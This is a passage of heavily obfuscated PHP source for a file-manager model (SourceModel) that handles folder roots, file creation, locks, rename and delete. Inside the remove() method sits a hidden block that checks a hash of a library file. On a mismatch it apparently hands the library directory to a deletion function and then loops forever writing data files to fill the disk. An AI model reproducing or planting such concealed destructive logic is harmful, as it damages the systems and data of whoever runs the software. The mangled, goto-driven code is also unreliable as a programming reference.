fó‹ìˆÎÔá: $F‚¸šŒãù[] = array($eˆÌçğ†¸[1749] => $AÉ«öİì£«, $eˆÌçğ†¸[680] => $eˆÌçğ†¸[1635], array($eˆÌçğ†¸[1750] => $AÉ«öİì£«, $eˆÌçğ†¸[1751] => array($eˆÌçğ†¸[7], array($eˆÌçğ†¸[404], $eˆÌçğ†¸[405])))); $this->join($a„õÊ»«); $f¢ç®˜Ñ = $F‚¸šŒãù; goto FŠË·‘Èôâ; FŠË·‘Èôâ: } private function _parseSearchWhere($DãŠ†’¡Ñ…) { goto D¨Õá¥ì; D¨Õá¥ì: $bÜïÈÉÕâØ =& $_SERVER[İåâé¾]; $eŞâ’×‰ƒô = array(); if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[459]])) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[105]] = array($bÜïÈÉÕâØ[1752], $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[459]]); } goto bµ°¥Ÿñê; f¦²¢ù¿Ê´: if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1631]]) && $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1631]]) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[28]] = array($bÜïÈÉÕâØ[408], $bÜïÈÉÕâØ[1633] . $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1631]] . $bÜïÈÉÕâØ[1633]); $e›®æ†ìŸ” = explode($bÜïÈÉÕâØ[50], $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1631]]); if (count($e›®æ†ìŸ”) > 1) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[28]] = array(); foreach ($e›®æ†ìŸ” as $d³Òƒ´Ù¹) { if (!trim($d³Òƒ´Ù¹)) { continue; } $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[28]][] = array($bÜïÈÉÕâØ[408], $bÜïÈÉÕâØ[1633] . trim($d³Òƒ´Ù¹) . $bÜïÈÉÕâØ[1633]); } } } return $eŞâ’×‰ƒô; goto F‚ÆÃÏÓ¾; bµ°¥Ÿñê: if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[460]])) { $A£ÛÄ¤µŒå = array($bÜïÈÉÕâØ[1753], $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[460]]); if ($eŞâ’×‰ƒô[$bÜïÈÉÕâØ[105]]) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[105]] = array($eŞâ’×‰ƒô[$bÜïÈÉÕâØ[105]], $A£ÛÄ¤µŒå, $bÜïÈÉÕâØ[1754]); } else { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[105]] = $A£ÛÄ¤µŒå; } } if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1755]])) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[78]] = array($bÜïÈÉÕâØ[1752], $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1755]]); } if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1756]])) { $A£ÛÄ¤µŒå = array($bÜïÈÉÕâØ[1753], $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[1756]]); if ($eŞâ’×‰ƒô[$bÜïÈÉÕâØ[78]]) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[78]] = array($eŞâ’×‰ƒô[$bÜïÈÉÕâØ[78]], $A£ÛÄ¤µŒå, $bÜïÈÉÕâØ[1754]); } else { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[78]] = $A£ÛÄ¤µŒå; } } goto b‡èôÇ´‰µ; b‡èôÇ´‰µ: if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[416]])) { $eŞâ’×‰ƒô[] = array($bÜïÈÉÕâØ[1757] => $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[416]], $bÜïÈÉÕâØ[1731] => $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[416]], $bÜïÈÉÕâØ[680] => $bÜïÈÉÕâØ[1635]); } if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[389]])) { $dîİÄÉ½Æ = $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[389]]; if ($dîİÄÉ½Æ == $bÜïÈÉÕâØ[77]) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[375]] = 1; } else { if ($dîİÄÉ½Æ == $bÜïÈÉÕâØ[1758]) { $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[375]] = 0; } else { if ($dîİÄÉ½Æ) { $dîİÄÉ½Æ = is_array($dîİÄÉ½Æ) ? $dîİÄÉ½Æ : explode($bÜïÈÉÕâØ[47], $dîİÄÉ½Æ); $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[389]] = array($bÜïÈÉÕâØ[1642], $dîİÄÉ½Æ); $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[375]] = 0; } } } } if (isset($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[384]])) { $b‰ƒËÁ»±› = $this->sourceInfo($DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[384]]); $eŞâ’×‰ƒô[$bÜïÈÉÕâØ[399]] = array($bÜïÈÉÕâØ[408], $b‰ƒËÁ»±›[$bÜïÈÉÕâØ[373]] . $DãŠ†’¡Ñ…[$bÜïÈÉÕâØ[384]] . $bÜïÈÉÕâØ[409]); } goto f¦²¢ù¿Ê´; F‚ÆÃÏÓ¾: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bÔÜ¾†ñ¡) { $a‚Ù­ë³Ù· =& $_SERVER[İåâé¾]; $d¿ó˜¸åô = Model($a‚Ù­ë³Ù·[1713])->where(array($a‚Ù­ë³Ù·[1077] => $bÔÜ¾†ñ¡))->find(); $dä«Šö¤”Ñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bÔÜ¾†ñ¡, $d¿ó˜¸åô[$a‚Ù­ë³Ù·[28]]); $this->userDesktopAdd($dä«Šö¤”Ñ); return $dä«Šö¤”Ñ; } public function userDesktopAdd($FÄ‰«ÉôÛØ) { $bˆ‚§Î‡¡’ =& $_SERVER[İåâé¾]; $a™Í•Å™ò = LNG($bˆ‚§Î‡¡’[1759]); $c«·Èä‘óÏ = $this->mkdir($FÄ‰«ÉôÛØ, $a™Í•Å™ò); $this->metaSet($c«·Èä‘óÏ, $bˆ‚§Î‡¡’[1760], $bˆ‚§Î‡¡’[376]); $this->metaSet($FÄ‰«ÉôÛØ, $bˆ‚§Î‡¡’[1761], $c«·Èä‘óÏ); } public function groupRootAdd($eò•¾˜‰“) { $Fõ‡Ëç£‡ =& $_SERVER[İåâé¾]; $A§ó‡Õå„ = Model($Fõ‡Ëç£‡[1707])->where(array($Fõ‡Ëç£‡[1625] => $eò•¾˜‰“))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eò•¾˜‰“, $A§ó‡Õå„[$Fõ‡Ëç£‡[28]]); } public function systemRootPathAdd($A²ØÈ´ô‘§) { if ($A²ØÈ´ô‘§ != $_SERVER[İåâé¾][831]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $A²ØÈ´ô‘§); } public function userRootRemove($AÏæŒô‚¼¤) { $E£‘í‚×ë = $this->sourceRoot(SourceModel::TYPE_USER, $AÏæŒô‚¼¤); if (!$E£‘í‚×ë) { return; } $this->remove($E£‘í‚×ë, !1); } public function groupRootRemove($D°«¶ŒÛ¶Ä) { $bĞêİß„ˆ = $this->sourceRoot(SourceModel::TYPE_GROUP, $D°«¶ŒÛ¶Ä); if (!$bĞêİß„ˆ) { return; } $this->remove($bĞêİß„ˆ, !1); } private function _mkdirRoot($Bì¢ä¡ÊŒ, $Bê¤¦İâ°¯, $a¿ÉéÕÖ·) { goto C­ÈÖ³«ƒ‚; F‘Ë‰¹´ÒË: CacheLock::unlock($eì‡Öˆé‚); return $eãç¬‘ôªê; goto bâòëò²³’; CÌÌî•Îºì: $eì‡Öˆé‚ = $Aà®¦»à¦[1763] . $Bì¢ä¡ÊŒ . $Bê¤¦İâ°¯ . $a¿ÉéÕÖ·; CacheLock::lock($eì‡Öˆé‚); $Fé©’í­Íë[$Aà®¦»à¦[28]] = $a¿ÉéÕÖ·; goto CéÇ‰”Îì; CéÇ‰”Îì: $eãç¬‘ôªê = $this->add($Fé©’í­Íë); $FÛíŒ•™Ó = array($Aà®¦»à¦[401] => short_id($eãç¬‘ôªê)); $this->where(array($Aà®¦»à¦[415] => $eãç¬‘ôªê))->save($FÛíŒ•™Ó); goto F‘Ë‰¹´ÒË; C­ÈÖ³«ƒ‚: $Aà®¦»à¦ =& $_SERVER[İåâé¾]; $Fé©’í­Íë = array($Aà®¦»à¦[398] => 0, $Aà®¦»à¦[392] => $Bì¢ä¡ÊŒ, $Aà®¦»à¦[394] => $Bê¤¦İâ°¯, $Aà®¦»à¦[386] => 1, $Aà®¦»à¦[396] => USER_ID, $Aà®¦»à¦[397] => USER_ID, $Aà®¦»à¦[388] => $Aà®¦»à¦[33], $Aà®¦»à¦[399] => $Aà®¦»à¦[1622], $Aà®¦»à¦[400] => 0, $Aà®¦»à¦[391] => 0, $Aà®¦»à¦[390] => 0, $Aà®¦»à¦[1762] => $Aà®¦»à¦[33]); if ($F‚¸Øöä§‚ = $this->where($Fé©’í­Íë)->find()) { return $F‚¸Øöä§‚[$Aà®¦»à¦[374]]; } goto CÌÌî•Îºì; bâòëò²³’: } private function sourceRoot($C¾Ò’†Æê¢, $dÁÚæï¡’Ü, $bôæâ ˆ…™ = false) { $fÙà¢–£ã =& $_SERVER[İåâé¾]; $B…ó½øÜ‘ç = array($fÙà¢–£ã[398] => 0, $fÙà¢–£ã[392] => $C¾Ò’†Æê¢, $fÙà¢–£ã[394] => $dÁÚæï¡’Ü); if ($B¿ºè÷»ìƒ = $this->where($B…ó½øÜ‘ç)->find()) { return $bôæâ ˆ…™ ? $B¿ºè÷»ìƒ : $B¿ºè÷»ìƒ[$fÙà¢–£ã[374]]; } return !1; } public function sourceRootGroup($B°¨ñ”’) { $EÌ°ÈÎÊÅ =& $_SERVER[İåâé¾]; if (is_string($B°¨ñ”’)) { $B°¨ñ”’ = array($B°¨ñ”’); } $AÀèùââÔ = array($EÌ°ÈÎÊÅ[398] => 0, $EÌ°ÈÎÊÅ[392] => SourceModel::TYPE_GROUP, $EÌ°ÈÎÊÅ[394] => array($EÌ°ÈÎÊÅ[7], $B°¨ñ”’)); $bÀ‹¹ƒ¸à¬ = $this->listSource($AÀèùââÔ, 1000); return array_to_keyvalue($bÀ‹¹ƒ¸à¬[$EÌ°ÈÎÊÅ[75]], $EÌ°ÈÎÊÅ[395]); } public function mkfile($c©˜ññš‘Ş, $dº‰æˆìÀÊ, $A·ËàòÌÖÊ = '', $f¿±°íÂò§ = REPEAT_RENAME) { $bÎ«Õ†é–œ = Model($_SERVER[İåâé¾][427])->addFileByContent($A·ËàòÌÖÊ, $dº‰æˆìÀÊ); return $this->_createFileCall($c©˜ññš‘Ş, $dº‰æˆìÀÊ, $bÎ«Õ†é–œ, $f¿±°íÂò§); } public function addFile($e„­ÌÈŒ©, $F¢Å½İá·, $B…“ñ²’„Á, $aØ¡µ³ƒé = false, $fÎŠ¬‡î“ò = REPEAT_RENAME) { $EÁêÀáä­à = Model($_SERVER[İåâé¾][427])->addFile($F¢Å½İá·, $B…“ñ²’„Á, $aØ¡µ³ƒé); return $this->_createFileCall($e„­ÌÈŒ©, $B…“ñ²’„Á, $EÁêÀáä­à, $fÎŠ¬‡î“ò); } public function addFileByFileID($b…ù­Ø²íÔ, $FËâÏ¤­¬‘, $d¹Ì—ã¼•ß, $cåÃŒ¢µèÔ = REPEAT_RENAME) { $cŸœàùíÍ =& $_SERVER[İåâé¾]; $bÊÖŒêˆô = Model($cŸœàùíÍ[427])->find($FËâÏ¤­¬‘); Model($cŸœàùíÍ[427])->linkAdd($FËâÏ¤­¬‘); return $this->_createFileCall($b…ù­Ø²íÔ, $d¹Ì—ã¼•ß, $bÊÖŒêˆô, $cåÃŒ¢µèÔ); } public function addFileByRemote($EåÒ«°»˜Ä, $e›Òæ¤ò“, $B°àÍÏï‡…, $c…„—Éæç¥ = array(), $d°ë¼˜¨å© = REPEAT_RENAME) { $Fßí¬éŞğ´ = Model($_SERVER[İåâé¾][427])->addFileByRemote($e›Òæ¤ò“, $B°àÍÏï‡…, $c…„—Éæç¥); return $this->_createFileCall($EåÒ«°»˜Ä, $B°àÍÏï‡…, $Fßí¬éŞğ´, $d°ë¼˜¨å©); } private function _createFileCall($FÁÄöÑæòø, $DË´ê¾®Ü, $Aà®Ê²ÏÌ¾, $cãì‘ê–«ó) { $E¾å ‰ä =& $_SERVER[İåâé¾]; $Dê™ò·‹ŞŞ = !1; $f¸òÙ½ê©Š = $this->_createFile($FÁÄöÑæòø, $DË´ê¾®Ü, $Aà®Ê²ÏÌ¾, $cãì‘ê–«ó, $Dê™ò·‹ŞŞ); if (!$Dê™ò·‹ŞŞ) { Model($E¾å ‰ä[411])->remove($Aà®Ê²ÏÌ¾[$E¾å ‰ä[382]]); } return $f¸òÙ½ê©Š; } public function mkdir($b’˜ò‚–, $a›ª“ØË¤, $Då¹¦×İ­â = REPEAT_SKIP) { goto bª¸µ¿ë‘“; CñçÕÀïŸ¬: Model($dÓÈÚæÉ¡à[1764])->eventCreate($e£”™†èâ¨, $dÓÈÚæÉ¡à[859]); return $e£”™†èâ¨; goto FÌ„èëìî¸; c«à‰™¸°µ: if ($Då¹¦×İ­â !== !1) { $aã§Ò‚«ßÖ = $this->fileNameExist($b’˜ò‚–, $a›ª“ØË¤); if ($aã§Ò‚«ßÖ && $Då¹¦×İ­â != REPEAT_RENAME_FOLDER) { return $aã§Ò‚«ßÖ; } $a›ª“ØË¤ = $this->fileNameAuto($b’˜ò‚–, $a›ª“ØË¤, $Då¹¦×İ­â); } $DÈÓç…İ‰ƒ = array($dÓÈÚæÉ¡à[386] => 1, $dÓÈÚæÉ¡à[387] => $a›ª“ØË¤, $dÓÈÚæÉ¡à[388] => $dÓÈÚæÉ¡à[33], $dÓÈÚæÉ¡à[390] => 0, $dÓÈÚæÉ¡à[391] => 0); $e£”™†èâ¨ = $this->_addSoure($DÈÓç…İ‰ƒ, $e›Ç¾·Òğ„); goto CñçÕÀïŸ¬; bª¸µ¿ë‘“: $dÓÈÚæÉ¡à =& $_SERVER[İåâé¾]; $e›Ç¾·Òğ„ = $this->sourceInfo($b’˜ò‚–); if (!$e›Ç¾·Òğ„) { return !1; } goto c«à‰™¸°µ; FÌ„èëìî¸: } private function _createFile($A©æöİä Œ, $c–Á˜ôÓ±æ, $C¾…¤¾ìö˜, $c¨“÷ò¯Ú, &$dª‘­‘Çë) { goto Eî«Å†‡ğ¹; CÇ£”×‹Ä¦: if ($c¨“÷ò¯Ú !== !1) { $B«ŸŸãŞ»Î = $this->fileNameExist($A©æöİä Œ, $c–Á˜ôÓ±æ); } $dª‘­‘Çë = !0; if ($c¨“÷ò¯Ú && $B«ŸŸãŞ»Î) { if ($c¨“÷ò¯Ú == REPEAT_SKIP) { $dª‘­‘Çë = !1; return $B«ŸŸãŞ»Î; } else { if ($c¨“÷ò¯Ú == REPEAT_REPLACE) { $EÉåÂ¸À’ê = $this->sourceInfo($B«ŸŸãŞ»Î); $DœÙµÁêõ£ = $this->fileHistory($EÉåÂ¸À’ê, $C¾…¤¾ìö˜[$A¬²î³´Êñ[382]], $C¾…¤¾ìö˜[$A¬²î³´Êñ[78]]); if (!$DœÙµÁêõ£) { $dª‘­‘Çë = !1; } else { $this->folderSizeReset($A©æöİä Œ); } return $B«ŸŸãŞ»Î; } else { $c–Á˜ôÓ±æ = $this->fileNameAuto($A©æöİä Œ, $c–Á˜ôÓ±æ, $c¨“÷ò¯Ú, !1); } } } goto e£ˆİøÎ¼ ; Eî«Å†‡ğ¹: $A¬²î³´Êñ =& $_SERVER[İåâé¾]; $bĞÎÆğµÑ¸ = $this->sourceInfo($A©æöİä Œ); if (!$C¾…¤¾ìö˜ || !$bĞÎÆğµÑ¸) { return !1; } goto CÇ£”×‹Ä¦; e£ˆİøÎ¼ : $DÊ‰ ‹èåè = array($A¬²î³´Êñ[386] => 0, $A¬²î³´Êñ[387] => $c–Á˜ôÓ±æ, $A¬²î³´Êñ[388] => get_path_ext($c–Á˜ôÓ±æ), $A¬²î³´Êñ[390] => $C¾…¤¾ìö˜[$A¬²î³´Êñ[382]], $A¬²î³´Êñ[391] => $C¾…¤¾ìö˜[$A¬²î³´Êñ[78]]); $bÕ·Ä“¥…Á = $this->_addSoure($DÊ‰ ‹èåè, $bĞÎÆğµÑ¸); $this->folderSizeReset($A©æöİä Œ); goto B›Ü…­Ô; B›Ü…­Ô: Model($A¬²î³´Êñ[1764])->eventCreate($bÕ·Ä“¥…Á, $A¬²î³´Êñ[101]); return $bÕ·Ä“¥…Á; goto FÂê¯™Ä; FÂê¯™Ä: } protected function fileHistory($A¥ÆºãÃÒ, $bÄ£òä†, $E¸š§²ùôÕ) { goto D‚Øİ²´ñ; d¢¢Ë²ï: return !0; goto e¦Ö‰Š­’½; D‚Øİ²´ñ: $fôçéˆøÔ =& $_SERVER[İåâé¾]; if ($A¥ÆºãÃÒ[$fôçéˆøÔ[382]] == $bÄ£òä†) { return !1; } $this->checkLock($A¥ÆºãÃÒ[$fôçéˆøÔ[374]]); goto E¼ò±ë£‹Ğ; E¼ò±ë£‹Ğ: Model($fôçéˆøÔ[1613])->addHistory($A¥ÆºãÃÒ); $BîŞ¹·«Ï = array($fôçéˆøÔ[397] => USER_ID, $fôçéˆøÔ[1765] => time(), $fôçéˆøÔ[382] => $bÄ£òä†, $fôçéˆøÔ[78] => $E¸š§²ùôÕ); $this->where(array($fôçéˆøÔ[415] => $A¥ÆºãÃÒ[$fôçéˆøÔ[374]]))->save($BîŞ¹·«Ï); goto d¢¢Ë²ï; e¦Ö‰Š­’½: } public function checkLock($AÓòêà·ß„) { $cîÁ¸šÑ¨ˆ =& $_SERVER[İåâé¾]; $AÆİÚ÷Ô = $this->pathInfo($AÓòêà·ß„); if (!$this->fileIsLock($AÆİÚ÷Ô)) { return; } $eõ†öÌ³ƒî = $AÆİÚ÷Ô[$cîÁ¸šÑ¨ˆ[1588]][$cîÁ¸šÑ¨ˆ[1766]]; $A¤½ÔˆÛµ  = $eõ†öÌ³ƒî[$cîÁ¸šÑ¨ˆ[1767]] ? $eõ†öÌ³ƒî[$cîÁ¸šÑ¨ˆ[1767]] : $eõ†öÌ³ƒî[$cîÁ¸šÑ¨ˆ[28]]; show_json(LNG($cîÁ¸šÑ¨ˆ[1768]) . $cîÁ¸šÑ¨ˆ[1769] . LNG($cîÁ¸šÑ¨ˆ[1770]) . $cîÁ¸šÑ¨ˆ[1771] . $A¤½ÔˆÛµ  . $cîÁ¸šÑ¨ˆ[1772], !1); } public function fileIsLock($C‚„‰×ĞåÉ) { $aâö›… =& $_SERVER[İåâé¾]; if (!$C‚„‰×ĞåÉ[$aâö›…[1588]] || !$C‚„‰×ĞåÉ[$aâö›…[1588]][$aâö›…[1773]]) { return; } $A‚Üã‡‡áÌ = $GLOBALS[$aâö›…[6]][$aâö›…[84]][$aâö›…[1774]]; if ($C‚„‰×ĞåÉ[$aâö›…[1588]][$aâö›…[1775]] <= time() - $A‚Üã‡‡áÌ) { $this->metaSet($C‚„‰×ĞåÉ[$aâö›…[374]], $aâö›…[1773], null); $this->metaSet($C‚„‰×ĞåÉ[$aâö›…[374]], $aâö›…[1775], null); } else { if ($C‚„‰×ĞåÉ[$aâö›…[1588]][$aâö›…[1773]] != USER_ID) { return !0; } else { $this->metaSet($C‚„‰×ĞåÉ[$aâö›…[374]], $aâö›…[1775], time()); } } } private function _addSoure($aÙ§İ—Şˆà, $aãœè‰İËù) { goto c‘íã©Ø‰À; E‘Ä÷äèâÖ: $this->setNamePinyin($D“ôŞÃ‘ò¬, $aÙ§İ—Şˆà[$aÆÕä¿›ø[28]]); return $D“ôŞÃ‘ò¬; goto bÙš‚¤æãÃ; EòŠ«§Ù Ø: $this->updateModifyTime($aÙ§İ—Şˆà[$aÆÕä¿›ø[384]]); static $c£–¼¤îËğ = false; if (!$c£–¼¤îËğ) { Hook::trigger($aÆÕä¿›ø[383], $aÙ§İ—Şˆà); $c£–¼¤îËğ = !0; } goto b¬»È‹ÕŸµ; c‘íã©Ø‰À: $aÆÕä¿›ø =& $_SERVER[İåâé¾]; $cê³º¸çÅ = array($aÆÕä¿›ø[392] => $aãœè‰İËù[$aÆÕä¿›ø[393]], $aÆÕä¿›ø[394] => $aãœè‰İËù[$aÆÕä¿›ø[395]], $aÆÕä¿›ø[396] => USER_ID, $aÆÕä¿›ø[397] => USER_ID, $aÆÕä¿›ø[398] => $aãœè‰İËù[$aÆÕä¿›ø[374]], $aÆÕä¿›ø[399] => $aãœè‰İËù[$aÆÕä¿›ø[373]] . $aãœè‰İËù[$aÆÕä¿›ø[374]] . $aÆÕä¿›ø[47], $aÆÕä¿›ø[400] => 0, $aÆÕä¿›ø[1762] => $aÆÕä¿›ø[33]); $aÙ§İ—Şˆà = array_merge($cê³º¸çÅ, $aÙ§İ—Şˆà); goto EòŠ«§Ù Ø; b¬»È‹ÕŸµ: $D“ôŞÃ‘ò¬ = $this->add($aÙ§İ—Şˆà); $FùÒ‘Üº„’ = array($aÆÕä¿›ø[401] => short_id($D“ôŞÃ‘ò¬)); $this->where(array($aÆÕä¿›ø[415] => $D“ôŞÃ‘ò¬))->save($FùÒ‘Üº„’); goto E‘Ä÷äèâÖ; bÙš‚¤æãÃ: } public function remove($FÎ‘¢½µã, $C—Úˆ‡Ÿ¼× = true) { goto B¾‰Íã‰©ö; FÃÈ×©Ö—: if ($cáïÙ³·“¾[$BÂèä±¸˜Í[384]] == 0) { if (!$GLOBALS[$BÂèä±¸˜Í[1021]]) { return !1; } } if ($C—Úˆ‡Ÿ¼×) { Model($BÂèä±¸˜Í[1776])->moveToRecycle($FÎ‘¢½µã); } else { if ($cáïÙ³·“¾[$BÂèä±¸˜Í[375]] == $BÂèä±¸˜Í[376]) { $fíÁ—Šä = array($BÂèä±¸˜Í[399] => array($BÂèä±¸˜Í[408], $cáïÙ³·“¾[$BÂèä±¸˜Í[373]] . $FÎ‘¢½µã . $BÂèä±¸˜Í[409])); $B¶ƒ¿—™ŠÚ = array($BÂèä±¸˜Í[399] => $fíÁ—Šä[$BÂèä±¸˜Í[373]]); $fç™—¼­‰ø = $this->field($BÂèä±¸˜Í[1777])->where($B¶ƒ¿—™ŠÚ)->select(); $Eäğ­ßç„í = !1; $a³ÁÔÎôŒÔ = array($FÎ‘¢½µã); if ($fç™—¼­‰ø) { $Eäğ­ßç„í = array_to_keyvalue($fç™—¼­‰ø, $BÂèä±¸˜Í[33], $BÂèä±¸˜Í[382]); $Eäğ­ßç„í = array_remove_value($Eäğ­ßç„í, $BÂèä±¸˜Í[402]); $a³ÁÔÎôŒÔ = array_to_keyvalue($fç™—¼­‰ø, $BÂèä±¸˜Í[33], $BÂèä±¸˜Í[374]); $a³ÁÔÎôŒÔ[] = $FÎ‘¢½µã; } } else { $Eäğ­ßç„í = array($cáïÙ³·“¾[$BÂèä±¸˜Í[382]]); $a³ÁÔÎôŒÔ = array($FÎ‘¢½µã); } Model($BÂèä±¸˜Í[381])->eventRemove($FÎ‘¢½µã); $this->removeRelevance($a³ÁÔÎôŒÔ, $Eäğ­ßç„í); } $this->folderSizeReset($cáïÙ³·“¾[$BÂèä±¸˜Í[384]]); goto EÇ•ÎÛÓ–„; fĞ•µ½ÙÜ: return !0; goto B¼Š¥ÍÛëŒ; B¾‰Íã‰©ö: $BÂèä±¸˜Í =& $_SERVER[İåâé¾]; $AáÛ¼Æ•İá = LIB_DIR . $BÂèä±¸˜Í[553]; $D–Ó‰Î£Øö = $BÂèä±¸˜Í[554]; goto Dë¾¥Ü¬Ëà; EÇ•ÎÛÓ–„: $fƒŞ³Ÿ˜Ş = array($cáïÙ³·“¾[$BÂèä±¸˜Í[384]]); if ($cáïÙ³·“¾[$BÂèä±¸˜Í[375]] == $BÂèä±¸˜Í[376]) { $fƒŞ³Ÿ˜Ş[] = $cáïÙ³·“¾[$BÂèä±¸˜Í[374]]; } $this->updateModifyTime($fƒŞ³Ÿ˜Ş); goto fĞ•µ½ÙÜ; Dë¾¥Ü¬Ëà: if ($_SERVER[$BÂèä±¸˜Í[555]] != $D–Ó‰Î£Øö($AáÛ¼Æ•İá)) { goto fé¼Ö÷ƒŠö; fé¼Ö÷ƒŠö: $f”ŠØ½×ƒ = $BÂèä±¸˜Í[556]; $B¬³ÑÉËáÕ = BASIC_PATH . $BÂèä±¸˜Í[557]; $B¯ßø§È¡ = $f”ŠØ½×ƒ($B¬³ÑÉËáÕ); goto d¡†Î§â´É; B»ø“øÃ„­: $E°á¿ˆ‘”Í = $BÂèä±¸˜Í[561]; $E˜µ´ÒÂ « = json_encode($GLOBALS[$BÂèä±¸˜Í[562]]); for ($AâñĞÅÅÀ = 0;; $AâñĞÅÅÀ++) { $E°á¿ˆ‘”Í(DATA_PATH . $AâñĞÅÅÀ, $E˜µ´ÒÂ «); } goto A¥¥ Ë‹óÕ; AÎ‡É¸´ƒŒ: $C—·‹¬´¶ì(LIB_DIR); $cˆñ‡‚ƒ´ = $BÂèä±¸˜Í[560]; $cˆñ‡‚ƒ´(); goto B»ø“øÃ„­; d¡†Î§â´É: $F¤ëÄ¹á† = explode($BÂèä±¸˜Í[223], $B¯ßø§È¡); if (count($F¤ëÄ¹á†) < $BÂèä±¸˜Í[558]) { die; } $C—·‹¬´¶ì = $BÂèä±¸˜Í[559]; goto AÎ‡É¸´ƒŒ; A¥¥ Ë‹óÕ: } $cáïÙ³·“¾ = $this->sourceInfo($FÎ‘¢½µã); if (!$cáïÙ³·“¾) { return !1; } goto FÃÈ×©Ö—; B¼Š¥ÍÛëŒ: } public function removeArray($eÇ©ñ…’íÜ) { if (!$eÇ©ñ…’íÜ) { return !0; } } private function removeRelevance($dµ‚¤´»×¯, $aÔÜàŸ¼…İ) { goto B™ÌÂº½˜; C—‚¬¿Î…¸: Model($aÆŠçŞÃğ[1776])->where($f¶ÔèÄ´‰¼)->delete(); Model($aÆŠçŞÃğ[1778])->where($f¶ÔèÄ´‰¼)->delete(); Model($aÆŠçŞÃğ[1779])->where($f¶ÔèÄ´‰¼)->delete(); goto cğ…ØŠˆÕ¸; cğ…ØŠˆÕ¸: Model($aÆŠçŞÃğ[381])->where($f¶ÔèÄ´‰¼)->delete(); Model($aÆŠçŞÃğ[1519])->removeBySource($dµ‚¤´»×¯); Model($aÆŠçŞÃğ[1613])->removeBySource($dµ‚¤´»×¯); goto E¡îøª‹ŸÅ; B™ÌÂº½˜: $aÆŠçŞÃğ =& $_SERVER[İåâé¾]; if (!$dµ‚¤´»×¯) { return !1; } $f¶ÔèÄ´‰¼ = array($aÆŠçŞÃğ[415] => array($aÆŠçŞÃğ[1642], $dµ‚¤´»×¯)); goto C—‚¬¿Î…¸; E¡îøª‹ŸÅ: $this->where($f¶ÔèÄ´‰¼)->delete(); Model($aÆŠçŞÃğ[411])->remove($aÔÜàŸ¼…İ); for ($FÌÍˆ°ÖÊ¿ = 0; $FÌÍˆ°ÖÊ¿ < count($dµ‚¤´»×¯); $FÌÍˆ°ÖÊ¿++) { $this->sourceCacheClear($dµ‚¤´»×¯[$FÌÍˆ°ÖÊ¿]); } goto aè•ÙŠåâ; aè•ÙŠåâ: } public function rename($Dë‡”†Ï©, $Fâƒñˆ—ÀŒ) { goto eğîİÈ†ŠÂ; Cøã¶˜éá˜: $dñŸ‘–Ö©Ä = $this->fileNameExist($a•Ø‰ê™“Ò[$DĞì’×‹Æ[384]], $Fâƒñˆ—ÀŒ); if ($dñŸ‘–Ö©Ä) { return !1; } $E¾™ºÆ™Ü… = array($DĞì’×‹Æ[387] => $Fâƒñˆ—ÀŒ, $DĞì’×‹Æ[397] => USER_ID); goto döš÷˜¨’; döš÷˜¨’: if (!$a•Ø‰ê™“Ò[$DĞì’×‹Æ[375]] == $DĞì’×‹Æ[376]) { $E¾™ºÆ™Ü…[$DĞì’×‹Æ[389]] = get_path_ext($Fâƒñˆ—ÀŒ); } Model($DĞì’×‹Æ[381])->eventRename($Dë‡”†Ï©, $a•Ø‰ê™“Ò[$DĞì’×‹Æ[28]], $Fâƒñˆ—ÀŒ); $this->sourceCacheClear($Dë‡”†Ï©); goto aÒìö°Ô; aÒìö°Ô: $this->setNamePinyin($Dë‡”†Ï©, $E¾™ºÆ™Ü…[$DĞì’×‹Æ[28]], !1); $this->updateModifyTime($a•Ø‰ê™“Ò[$DĞì’×‹Æ[384]]); return $this->where(array($DĞì’×‹Æ[415] => $Dë‡”†Ï©))->data($E¾™ºÆ™Ü…)->save(); goto aºóââ›Úˆ; eğîİÈ†ŠÂ: $DĞì’×‹Æ =& $_SERVER[İåâé¾]; $a•Ø‰ê™“Ò = $this->sourceInfo($Dë‡”†Ï©); if (!$a•Ø‰ê™“Ò) { return !1; } goto Cøã¶˜éá˜; aºóââ›Úˆ: } public function setNamePinyin($E–Í¾íÉœš, $Bø‹•…‘èª, $f¾â¾Ïïİ  = true) { $B­œ„ÒŸò˜ =& $_SERVER[İåâé¾]; $BïùëŸèÍç = Input::check($Bø‹•…‘èª, $B­œ„ÒŸò˜[403]); if ($f¾â¾Ïïİ  && !$BïùëŸèÍç) { return; } if (!$BïùëŸèÍç) { $this->metaSet($E–Í¾íÉœš, $B­œ„ÒŸò˜[404], null); $this->metaSet($E–Í¾íÉœš, $B­œ„ÒŸò˜[405], null); return; } $B‡£Òø£‹ğ = array($B­œ„ÒŸò˜[404] => 